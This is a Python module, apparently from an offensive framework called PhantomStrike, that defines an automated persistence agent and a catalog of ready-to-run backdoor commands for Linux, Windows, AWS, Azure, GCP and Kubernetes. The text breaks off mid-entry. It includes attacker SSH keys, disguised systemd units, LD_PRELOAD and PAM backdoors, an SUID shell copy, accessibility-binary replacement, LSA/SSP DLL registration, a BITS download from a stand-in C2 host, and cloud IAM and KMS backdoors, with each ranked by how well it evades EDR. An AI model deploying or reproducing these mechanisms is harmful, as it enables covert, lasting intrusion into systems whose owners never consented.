"""
server_core/orchestrator/attack_agents/persistence_agent.py

Persistence specialist agent — PhantomStrike v3.0.

Extends BaseAgent with agent_type "persistence".  Deploys 2-3 redundant
persistence mechanisms on every owned host, selecting from 50+ techniques
across Linux, Windows, and Cloud targets.  Elite knowledge of which
mechanisms are EDR-monitored vs. stealthy drives mechanism selection.

Real tool integrations:
  - diskless-persist : fileless / memory-only persistence
  - execute_command  : generic command execution on owned hosts

Think method reads the environment from Hive Mind, prioritises stealth
when EDR is detected, and ensures redundancy across mechanism families.
"""

from __future__ import annotations

import logging
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple, TYPE_CHECKING

from server_core.orchestrator.agent_base import (
    BaseAgent,
    CAPABILITY_LIBRARY,
    AgentResult,
)

if TYPE_CHECKING:
    from server_core.orchestrator.hive_mind import HiveMind

logger = logging.getLogger(__name__)


# =============================================================================
# 50+ persistence mechanisms catalogued by platform, family, and EDR signature
# =============================================================================

PERSISTENCE_CATALOG: Dict[str, List[Dict[str, Any]]] = {
    # ── Linux persistence mechanisms ──
    "linux": [
        # --- Shell / init hooks (high stealth, file-based but low EDR signature) ---
        {
            "id": "ssh_authorized_keys",
            "name": "SSH Authorized Keys",
            "family": "ssh_keys",
            "mechanism": "Append attacker public key to ~/.ssh/authorized_keys",
            "stealth": "high",
            "edr_visible": False,
            "requires_root": False,
            "persist_cmd": "echo '<pubkey>' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
            "verify_cmd": "grep -q '<pubkey_fp>' ~/.ssh/authorized_keys && echo 'installed'",
            "remove_cmd": "sed -i '/<pubkey_fp>/d' ~/.ssh/authorized_keys",
        },
        {
            "id": "ssh_environment_stealth_key",
            "name": "SSH Environment Key",
            "family": "ssh_keys",
            "mechanism": "Drop key in ~/.ssh/environment or sshd_config AuthorizedKeysCommand",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_root": False,
            "persist_cmd": "echo 'key=<b64_pubkey>' >> ~/.ssh/environment",
        },
        # --- Cron-family (medium stealth, commonly monitored) ---
        {
            "id": "user_crontab",
            "name": "User Crontab",
            "family": "cron",
            "mechanism": "crontab -e to add user-level recurring job",
            "stealth": "medium",
            "edr_visible": False,
            "requires_root": False,
            "persist_cmd": "(crontab -l 2>/dev/null; echo '*/5 * * * * <payload>') | crontab -",
            "verify_cmd": "crontab -l | grep -q '<payload>' && echo 'installed'",
            "remove_cmd": "crontab -l | grep -v '<payload>' | crontab -",
        },
        {
            "id": "system_crontab",
            "name": "System Crontab",
            "family": "cron",
            "mechanism": "Append to /etc/crontab with user field",
            "stealth": "low",
            "edr_visible": True,
            "requires_root": True,
            "persist_cmd": "echo '*/7 * * * * root <payload>' >> /etc/crontab",
            "verify_cmd": "grep -q '<payload>' /etc/crontab && echo 'installed'",
            "remove_cmd": "sed -i '/<payload>/d' /etc/crontab",
        },
        {
            "id": "cron_d_entry",
            "name": "Cron.d Entry",
            "family": "cron",
            "mechanism": "Drop a file into /etc/cron.d/",
            "stealth": "medium",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": "echo '*/10 * * * * root <payload>' > /etc/cron.d/system-sync",
        },
        {
            "id": "cron_hourly",
            "name": "Cron Hourly/Daily/Weekly",
            "family": "cron",
            "mechanism": "Drop script into /etc/cron.hourly/",
            "stealth": "medium",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": "cp <payload> /etc/cron.hourly/ntp-sync && chmod +x /etc/cron.hourly/ntp-sync",
        },
        {
            "id": "at_job",
            "name": "At Job Scheduler",
            "family": "scheduler",
            "mechanism": "Schedule one-shot or recurring at jobs",
            "stealth": "high",
            "edr_visible": False,
            "requires_root": False,
            "persist_cmd": "echo '<payload>' | at now + 5 minutes",
        },
        # --- systemd (medium-high stealth, blending potential) ---
        {
            "id": "systemd_service",
            "name": "Systemd Service",
            "family": "systemd",
            "mechanism": "Create a systemd service unit that runs at boot",
            "stealth": "medium",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": (
                "cat > /etc/systemd/system/systemd-networkd-helper.service <<'EOF'\n"
                "[Unit]\nDescription=Network Helper Service\n"
                "[Service]\nType=simple\nExecStart=<payload>\nRestart=always\n"
                "[Install]\nWantedBy=multi-user.target\n"
                "EOF\n"
                "systemctl daemon-reload && systemctl enable systemd-networkd-helper.service"
            ),
            "verify_cmd": "systemctl is-enabled systemd-networkd-helper.service && echo 'installed'",
            "remove_cmd": "systemctl disable systemd-networkd-helper.service && rm -f /etc/systemd/system/systemd-networkd-helper.service",
        },
        {
            "id": "systemd_timer",
            "name": "Systemd Timer",
            "family": "systemd",
            "mechanism": "Create a systemd timer + service pair for recurring execution",
            "stealth": "high",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": (
                "cat > /etc/systemd/system/cache-cleanup.timer <<'EOF'\n"
                "[Unit]\nDescription=Cache Cleanup Timer\n"
                "[Timer]\nOnBootSec=60s\nOnUnitActiveSec=300s\n"
                "[Install]\nWantedBy=timers.target\n"
                "EOF\n"
                "cat > /etc/systemd/system/cache-cleanup.service <<'EOF'\n"
                "[Unit]\nDescription=Cache Cleanup Service\n"
                "[Service]\nType=oneshot\nExecStart=<payload>\n"
                "EOF\n"
                "systemctl daemon-reload && systemctl enable cache-cleanup.timer"
            ),
        },
        {
            "id": "user_systemd_service",
            "name": "User Systemd Service",
            "family": "systemd",
            "mechanism": "Create a user-scoped systemd service (no root needed)",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_root": False,
            "persist_cmd": (
                "mkdir -p ~/.config/systemd/user/ && "
                "cat > ~/.config/systemd/user/dbus-helper.service <<'EOF'\n"
                "[Unit]\nDescription=DBus Helper\n"
                "[Service]\nType=simple\nExecStart=<payload>\nRestart=always\n"
                "[Install]\nWantedBy=default.target\n"
                "EOF\n"
                "systemctl --user daemon-reload && systemctl --user enable dbus-helper.service"
            ),
        },
        # --- Shell profile hooks (high stealth) ---
        {
            "id": "bashrc_hook",
            "name": "Bashrc / Profile Hook",
            "family": "shell_profile",
            "mechanism": "Append command to ~/.bashrc, ~/.profile, or ~/.zshrc",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_root": False,
            "persist_cmd": "echo '<payload> &>/dev/null &' >> ~/.bashrc",
        },
        {
            "id": "profile_d_script",
            "name": "Profile.d Script",
            "family": "shell_profile",
            "mechanism": "Drop a script in /etc/profile.d/",
            "stealth": "medium",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": "echo '<payload> &' > /etc/profile.d/90-system-health.sh && chmod +x /etc/profile.d/90-system-health.sh",
        },
        {
            "id": "xdg_autostart",
            "name": "XDG Autostart Entry",
            "family": "desktop_autostart",
            "mechanism": "Create .desktop file in ~/.config/autostart/ for GUI sessions",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_root": False,
            "persist_cmd": (
                "mkdir -p ~/.config/autostart/ && "
                "cat > ~/.config/autostart/policykit-agent.desktop <<'EOF'\n"
                "[Desktop Entry]\nType=Application\nName=PolicyKit Agent\n"
                "Exec=<payload>\nX-GNOME-Autostart-enabled=true\n"
                "EOF"
            ),
        },
        # --- Library hijacking (very high stealth, advanced) ---
        {
            "id": "ld_preload_backdoor",
            "name": "LD_PRELOAD Backdoor",
            "family": "library_hijack",
            "mechanism": "Preload a malicious shared library via /etc/ld.so.preload or LD_PRELOAD",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": "echo '/lib/libsystemd-daemon.so.2' >> /etc/ld.so.preload",
        },
        {
            "id": "ld_library_path_hijack",
            "name": "LD_LIBRARY_PATH Hijacking",
            "family": "library_hijack",
            "mechanism": "Set LD_LIBRARY_PATH in shell profile to inject malicious library",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_root": False,
            "persist_cmd": "echo 'export LD_LIBRARY_PATH=/tmp/.cache:$LD_LIBRARY_PATH' >> ~/.bashrc",
        },
        {
            "id": "pam_backdoor",
            "name": "PAM Module Backdoor",
            "family": "library_hijack",
            "mechanism": "Replace or augment a PAM module to accept a master password",
            "stealth": "extreme",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": (
                "# Compile pam_unix backdoor .so and replace /lib/security/pam_unix.so\n"
                "# [STUB] PAM backdoor — integrate pam_backdoor.c compilation"
            ),
        },
        # --- Init system hooks ---
        {
            "id": "rc_local_hook",
            "name": "rc.local Hook",
            "family": "init",
            "mechanism": "Append command to /etc/rc.local before exit 0",
            "stealth": "medium",
            "edr_visible": True,
            "requires_root": True,
            "persist_cmd": "sed -i 's|^exit 0|<payload>\\nexit 0|' /etc/rc.local",
        },
        {
            "id": "init_d_script",
            "name": "Init.d Script",
            "family": "init",
            "mechanism": "Install a SysV init script with symlinks in rcN.d/",
            "stealth": "medium",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": "cp <payload> /etc/init.d/system-health && update-rc.d system-health defaults",
        },
        # --- Binary / SUID hijacking ---
        {
            "id": "suid_backdoor",
            "name": "SUID Binary Backdoor",
            "family": "binary_hijack",
            "mechanism": "Create a SUID-root binary that spawns a shell",
            "stealth": "high",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": "cp /bin/bash /tmp/.systemd-helper && chmod u+s /tmp/.systemd-helper",
        },
        {
            "id": "motd_backdoor",
            "name": "MOTD / Update-motd.d Hook",
            "family": "shell_profile",
            "mechanism": "Drop a script into /etc/update-motd.d/ to execute on every login",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": "echo -e '#!/bin/bash\\n<payload> &' > /etc/update-motd.d/99-system-info && chmod +x /etc/update-motd.d/99-system-info",
        },
        # --- Kernel-level ---
        {
            "id": "kernel_module_rootkit",
            "name": "Kernel Module Rootkit",
            "family": "kernel",
            "mechanism": "Load a malicious LKM that hooks syscalls for stealth and persistence",
            "stealth": "extreme",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": (
                "# insmod /lib/modules/$(uname -r)/kernel/drivers/net/virtio_net.ko\n"
                "# [STUB] LKM rootkit — integrate with Diamorphine or similar"
            ),
        },
        {
            "id": "udev_rule_backdoor",
            "name": "udev Rule Backdoor",
            "family": "kernel",
            "mechanism": "Create a udev rule that triggers on a benign event (e.g. USB insert)",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_root": True,
            "persist_cmd": "echo 'ACTION==\"add\", SUBSYSTEM==\"net\", RUN+=\"<payload>\"' > /etc/udev/rules.d/99-net-health.rules",
        },
    ],

    # ── Windows persistence mechanisms ──
    "windows": [
        # --- Registry Run keys (heavily EDR-monitored, use only as decoy) ---
        {
            "id": "registry_run_hklm",
            "name": "Registry Run Key (HKLM)",
            "family": "registry",
            "mechanism": "Set a value under HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "stealth": "low",
            "edr_visible": True,
            "requires_admin": True,
            "persist_cmd": 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "<payload>" /f',
            "verify_cmd": 'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate"',
            "remove_cmd": 'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /f',
        },
        {
            "id": "registry_run_hkcu",
            "name": "Registry Run Key (HKCU)",
            "family": "registry",
            "mechanism": "Set a value under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "stealth": "medium",
            "edr_visible": True,
            "requires_admin": False,
            "persist_cmd": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OneDriveSync" /t REG_SZ /d "<payload>" /f',
        },
        {
            "id": "registry_runonce",
            "name": "Registry RunOnce",
            "family": "registry",
            "mechanism": "RunOnce key executes once then self-deletes",
            "stealth": "medium",
            "edr_visible": True,
            "requires_admin": False,
            "persist_cmd": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "SetupCleanup" /t REG_SZ /d "<payload>" /f',
        },
        # --- Scheduled Tasks ---
        {
            "id": "scheduled_task_basic",
            "name": "Scheduled Task (Basic)",
            "family": "scheduler",
            "mechanism": "Create a scheduled task with schtasks.exe",
            "stealth": "medium",
            "edr_visible": True,
            "requires_admin": False,
            "persist_cmd": (
                'schtasks /create /tn "WindowsUpdateTask" /tr "<payload>" '
                '/sc daily /st 09:00 /f'
            ),
            "verify_cmd": 'schtasks /query /tn "WindowsUpdateTask"',
            "remove_cmd": 'schtasks /delete /tn "WindowsUpdateTask" /f',
        },
        {
            "id": "scheduled_task_hidden",
            "name": "Scheduled Task (Hidden)",
            "family": "scheduler",
            "mechanism": "Create a hidden scheduled task via XML import",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "# Create task XML with Hidden=true, then:\n"
                'schtasks /create /tn "MicrosoftEdgeUpdateTask" /xml task.xml /f'
            ),
        },
        # --- Windows Services ---
        {
            "id": "windows_service",
            "name": "Windows Service",
            "family": "service",
            "mechanism": "Create a Windows service with sc.exe",
            "stealth": "low",
            "edr_visible": True,
            "requires_admin": True,
            "persist_cmd": (
                'sc create "WindowsHealth" binPath= "<payload>" start= auto error= ignore '
                '&& sc description "WindowsHealth" "Windows Health Monitoring Service" '
                '&& sc start "WindowsHealth"'
            ),
            "verify_cmd": 'sc query "WindowsHealth"',
            "remove_cmd": 'sc delete "WindowsHealth"',
        },
        {
            "id": "service_dll_hijack",
            "name": "Service DLL Hijacking",
            "family": "service",
            "mechanism": "Replace a service DLL with malicious one while service is stopped",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": "# Identify stopped service, swap DLL, restart service",
        },
        # --- WMI Event Subscriptions ---
        {
            "id": "wmi_event_consumer",
            "name": "WMI Event Subscription (Permanent)",
            "family": "wmi",
            "mechanism": "Register a permanent WMI event filter/consumer pair",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "# Via PowerShell:\n"
                "$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription "
                "-Arguments @{Name='SystemHealth'; EventNamespace='root\\cimv2'; "
                "QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent "
                "WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'}\n"
                "$consumer = Set-WmiInstance -Class CommandLineEventConsumer "
                "-Namespace root\\subscription -Arguments @{Name='SystemHealthConsumer'; "
                "CommandLineTemplate='<payload>'}\n"
                "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription "
                "-Arguments @{Filter=$filter; Consumer=$consumer}"
            ),
        },
        {
            "id": "wmi_shortcut_trigger",
            "name": "WMI Shortcut / Process Trigger",
            "family": "wmi",
            "mechanism": "WMI subscription triggered on process creation (Win32_ProcessStartTrace)",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "# WMI filter on Win32_ProcessStartTrace for explorer.exe\n"
                "# Triggers payload on user login processes"
            ),
        },
        # --- DLL / COM hijacking ---
        {
            "id": "dll_search_order_hijack",
            "name": "DLL Search Order Hijacking",
            "family": "dll_hijack",
            "mechanism": "Place malicious DLL in a directory searched before the real DLL location",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": False,
            "persist_cmd": (
                "# Identify an application vulnerable to DLL sideloading\n"
                "# Place payload.dll in the application directory as a legitimate-sounding name\n"
                "# Example: version.dll, userenv.dll, propsys.dll"
            ),
        },
        {
            "id": "com_hijacking",
            "name": "COM Object Hijacking",
            "family": "dll_hijack",
            "mechanism": "Override a COM registration to load a malicious DLL",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": False,
            "persist_cmd": (
                "# Replace InProcServer32 path for a COM CLSID via registry\n"
                "reg add \"HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InProcServer32\" "
                "/ve /t REG_SZ /d \"<payload.dll>\" /f"
            ),
        },
        {
            "id": "netsh_helper_dll",
            "name": "Netsh Helper DLL",
            "family": "dll_hijack",
            "mechanism": "Register a malicious netsh helper DLL",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                'reg add "HKLM\\Software\\Microsoft\\NetSh" /v "HelperDllPath" '
                '/t REG_EXPAND_SZ /d "<payload.dll>" /f'
            ),
        },
        # --- Boot execute ---
        {
            "id": "boot_execute_native",
            "name": "Boot Execute (Native Binary)",
            "family": "boot",
            "mechanism": "Set a native binary to run at boot via BootExecute registry key",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                'reg add "HKLM\\System\\CurrentControlSet\\Control\\Session Manager" '
                '/v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *\\0<cmd>" /f'
            ),
        },
        # --- Image hijacks ---
        {
            "id": "ifeo_debugger",
            "name": "Image File Execution Options (Debugger)",
            "family": "image_hijack",
            "mechanism": "Set a debugger for a commonly launched process",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\'
                'Image File Execution Options\\sethc.exe" /v "Debugger" '
                '/t REG_SZ /d "<payload>" /f'
            ),
        },
        {
            "id": "accessibility_backdoor",
            "name": "Accessibility Features Backdoor (Sethc/Utilman)",
            "family": "image_hijack",
            "mechanism": "Replace sethc.exe, utilman.exe, or osk.exe with cmd.exe",
            "stealth": "low",
            "edr_visible": True,
            "requires_admin": True,
            "persist_cmd": (
                'takeown /f C:\\Windows\\System32\\sethc.exe && '
                'icacls C:\\Windows\\System32\\sethc.exe /grant Everyone:F && '
                'copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe'
            ),
        },
        # --- Winlogon hooks ---
        {
            "id": "winlogon_shell",
            "name": "Winlogon Shell Replacement",
            "family": "winlogon",
            "mechanism": "Replace or augment the Winlogon Shell value",
            "stealth": "medium",
            "edr_visible": True,
            "requires_admin": True,
            "persist_cmd": (
                'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" '
                '/v "Shell" /t REG_SZ /d "explorer.exe,<payload>" /f'
            ),
        },
        {
            "id": "winlogon_userinit",
            "name": "Winlogon Userinit Hook",
            "family": "winlogon",
            "mechanism": "Append to the Userinit value (comma-separated chain)",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" '
                '/v "Userinit" /t REG_SZ '
                '/d "C:\\Windows\\system32\\userinit.exe,<payload>" /f'
            ),
        },
        {
            "id": "appinit_dlls",
            "name": "AppInit_DLLs Injection",
            "family": "winlogon",
            "mechanism": "Load a DLL into every process that links user32.dll",
            "stealth": "medium",
            "edr_visible": True,
            "requires_admin": True,
            "persist_cmd": (
                'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" '
                '/v "AppInit_DLLs" /t REG_SZ /d "<payload.dll>" /f && '
                'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" '
                '/v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f'
            ),
        },
        {
            "id": "appcert_dlls",
            "name": "AppCertDlls Injection",
            "family": "winlogon",
            "mechanism": "DLL loaded by processes using Win32 API crypto functions",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                'reg add "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\'
                'AppCertDlls" /v "AppCertDll" /t REG_SZ /d "<payload.dll>" /f'
            ),
        },
        # --- LSA / SSP ---
        {
            "id": "lsa_auth_package",
            "name": "LSA Authentication Package",
            "family": "lsa",
            "mechanism": "Register a malicious LSA authentication package",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                'reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" '
                '/v "Authentication Packages" /t REG_MULTI_SZ '
                '/d "msv1_0\\0<dll_name>" /f'
            ),
        },
        {
            "id": "ssp_dll",
            "name": "Security Support Provider (SSP) DLL",
            "family": "lsa",
            "mechanism": "Register a malicious SSP to capture credentials and persist",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                'reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages" '
                '/v "Security Packages" /t REG_MULTI_SZ '
                '/d "kerberos\\0msv1_0\\0schannel\\0<dll_name>" /f'
            ),
        },
        # --- Other Windows mechanisms ---
        {
            "id": "powershell_profile",
            "name": "PowerShell Profile",
            "family": "shell_profile",
            "mechanism": "Add command to PowerShell profile script ($PROFILE)",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": False,
            "persist_cmd": (
                'echo "<payload>" >> $PROFILE.CurrentUserAllHosts'
            ),
        },
        {
            "id": "bits_job",
            "name": "BITS Job",
            "family": "scheduler",
            "mechanism": "Create a persistent BITS transfer job that executes on completion",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": False,
            "persist_cmd": (
                "Start-BitsTransfer -Source http://c2.example.com/beacon.exe "
                "-Destination C:\\ProgramData\\WindowsUpdate.exe "
                "-Asynchronous -Priority High"
            ),
        },
        {
            "id": "time_provider_dll",
            "name": "Time Provider DLL",
            "family": "dll_hijack",
            "mechanism": "Register a malicious time provider DLL loaded by w32time service",
            "stealth": "extreme",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                'reg add "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\'
                'NtpClient" /v "DllName" /t REG_SZ /d "<payload.dll>" /f'
            ),
        },
        {
            "id": "print_monitor_dll",
            "name": "Print Monitor DLL",
            "family": "dll_hijack",
            "mechanism": "Register a malicious print monitor DLL loaded by spoolsv.exe",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                'reg add "HKLM\\System\\CurrentControlSet\\Control\\Print\\Monitors\\'
                'SystemMonitor" /v "Driver" /t REG_SZ /d "<payload.dll>" /f'
            ),
        },
        {
            "id": "office_addin",
            "name": "Office Add-in Persistence",
            "family": "application",
            "mechanism": "Install a malicious Office/VSCode add-in or extension",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": False,
            "persist_cmd": (
                "# Drop VSTO add-in manifest or template with auto-open macro"
            ),
        },
        {
            "id": "screensaver_hijack",
            "name": "Screensaver Hijack",
            "family": "desktop_autostart",
            "mechanism": "Set a malicious .scr as the screensaver",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": False,
            "persist_cmd": (
                'reg add "HKCU\\Control Panel\\Desktop" /v "SCRNSAVE.EXE" '
                '/t REG_SZ /d "<payload.scr>" /f'
            ),
        },
        {
            "id": "startup_folder",
            "name": "Startup Folder Shortcut",
            "family": "desktop_autostart",
            "mechanism": "Drop a shortcut into the Startup folder",
            "stealth": "low",
            "edr_visible": True,
            "requires_admin": False,
            "persist_cmd": (
                'copy <payload.lnk> "%APPDATA%\\Microsoft\\Windows\\'
                'Start Menu\\Programs\\Startup\\WindowsUpdate.lnk"'
            ),
        },
    ],

    # ── Cloud persistence mechanisms ──
    "cloud": [
        # --- AWS ---
        {
            "id": "aws_iam_access_key",
            "name": "AWS IAM Access Key Backdoor",
            "family": "iam",
            "mechanism": "Create a secondary IAM access key for an existing privileged user",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "aws iam create-access-key --user-name <target_user> "
                "--profile compromised"
            ),
            "verify_cmd": "aws iam list-access-keys --user-name <target_user> --profile compromised",
            "remove_cmd": "aws iam delete-access-key --user-name <target_user> --access-key-id <key_id> --profile compromised",
        },
        {
            "id": "aws_lambda_trigger",
            "name": "AWS Lambda Trigger Backdoor",
            "family": "serverless",
            "mechanism": "Create or modify a Lambda function triggered by an innocuous event",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "aws lambda create-function --function-name cloudwatch-metrics-processor "
                "--runtime python3.11 --role <exec_role_arn> "
                "--handler index.handler --zip-file fileb://payload.zip "
                "--profile compromised"
            ),
        },
        {
            "id": "aws_lambda_layer",
            "name": "AWS Lambda Layer Backdoor",
            "family": "serverless",
            "mechanism": "Inject a Lambda layer that wraps existing function handlers",
            "stealth": "extreme",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "# Publish a Lambda layer version and attach to target functions\n"
                "# The layer overrides handler to execute backdoor before real code"
            ),
        },
        {
            "id": "aws_ec2_userdata",
            "name": "AWS EC2 User-Data Persistence",
            "family": "compute",
            "mechanism": "Modify EC2 instance user-data to include a reverse shell",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "# Modify instance user-data, then stop/start instance to re-execute\n"
                "# New user-data executes on next boot"
            ),
        },
        {
            "id": "aws_ssm_agent_hijack",
            "name": "AWS SSM Agent / Session Manager Abuse",
            "family": "compute",
            "mechanism": "Create an SSM document that runs periodically",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "aws ssm create-document --name 'SystemHealthCheck' "
                "--document-type Command --content file://ssm_doc.json "
                "--profile compromised"
            ),
        },
        {
            "id": "aws_cross_account_role",
            "name": "AWS Cross-Account IAM Role Trust",
            "family": "iam",
            "mechanism": "Add attacker AWS account to a role trust policy for persistent access",
            "stealth": "extreme",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "aws iam update-assume-role-policy --role-name <target_role> "
                "--policy-document file://trust_policy.json --profile compromised"
            ),
        },
        {
            "id": "aws_cloudtrail_suppression",
            "name": "CloudTrail Log Suppression Rule",
            "family": "defense_evasion",
            "mechanism": "Create an EventBridge rule that filters attacker actions from logs",
            "stealth": "extreme",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "# Create EventBridge rule that drops events matching attacker IP/UA\n"
                "# Coupled with CloudTrail → delivers stealth persistence"
            ),
        },
        {
            "id": "aws_kms_grant",
            "name": "AWS KMS Grant for External Access",
            "family": "defense_evasion",
            "mechanism": "Create a KMS grant allowing attacker account to decrypt data",
            "stealth": "extreme",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "aws kms create-grant --key-id <key_id> --grantee-principal "
                "<attacker_account> --operations Decrypt Encrypt --profile compromised"
            ),
        },
        # --- Azure ---
        {
            "id": "azure_vm_extension",
            "name": "Azure VM Extension Backdoor",
            "family": "compute",
            "mechanism": "Install a malicious VM extension that runs a script on the target VM",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "az vm extension set --resource-group <rg> --vm-name <vm> "
                "--name CustomScript --publisher Microsoft.Azure.Extensions "
                "--settings '{\"commandToExecute\": \"<payload>\"}'"
            ),
        },
        {
            "id": "azure_function_backdoor",
            "name": "Azure Function / WebJob Backdoor",
            "family": "serverless",
            "mechanism": "Deploy a malicious Azure Function triggered by timer/HTTP",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "az functionapp deployment source config-zip "
                "--resource-group <rg> --name <app_name> --src payload.zip"
            ),
        },
        {
            "id": "azure_service_principal",
            "name": "Azure Service Principal Backdoor",
            "family": "iam",
            "mechanism": "Create a service principal with privileged role assignments",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "az ad sp create-for-rbac --name 'AzureDevOps-Integration' "
                "--role Contributor --scopes /subscriptions/<sub_id>"
            ),
        },
        {
            "id": "azure_logic_app_trigger",
            "name": "Azure Logic App HTTP Trigger",
            "family": "serverless",
            "mechanism": "Deploy a Logic App with an HTTP trigger that runs commands",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "# Deploy ARM template with Logic App containing HTTP trigger\n"
                "# Trigger URL acts as external C2 channel"
            ),
        },
        # --- GCP ---
        {
            "id": "gcp_service_account_key",
            "name": "GCP Service Account Key Backdoor",
            "family": "iam",
            "mechanism": "Create a new key for a privileged service account",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "gcloud iam service-accounts keys create backdoor_key.json "
                "--iam-account <sa_email> --project <project_id>"
            ),
        },
        {
            "id": "gcp_cloud_function",
            "name": "GCP Cloud Function Backdoor",
            "family": "serverless",
            "mechanism": "Deploy a Cloud Function triggered by Pub/Sub or HTTP",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "gcloud functions deploy system-health-check "
                "--runtime python311 --trigger-http --source=./payload "
                "--entry-point=handler --project <project_id>"
            ),
        },
        {
            "id": "gcp_scheduler_job",
            "name": "GCP Cloud Scheduler + Workflows Backdoor",
            "family": "scheduler",
            "mechanism": "Create a scheduled Cloud Workflow that regularly exfiltrates data",
            "stealth": "very_high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "gcloud workflows deploy data-sync --source=workflow.yaml "
                "--location us-central1"
            ),
        },
        # --- Kubernetes ---
        {
            "id": "k8s_privileged_daemonset",
            "name": "Kubernetes Privileged DaemonSet",
            "family": "container",
            "mechanism": "Deploy a privileged DaemonSet that runs on every node",
            "stealth": "high",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
                "kubectl apply -f daemonset_backdoor.yaml\n"
                "# DaemonSet spec with hostPID: true, hostNetwork: true, privileged: true"
            ),
        },
        {
            "id": "k8s_webhook",
            "name": "Kubernetes Admission Webhook",
            "family": "container",
            "mechanism": "Register a mutating webhook that injects a sidecar on new pods",
            "stealth": "extreme",
            "edr_visible": False,
            "requires_admin": True,
            "persist_cmd": (
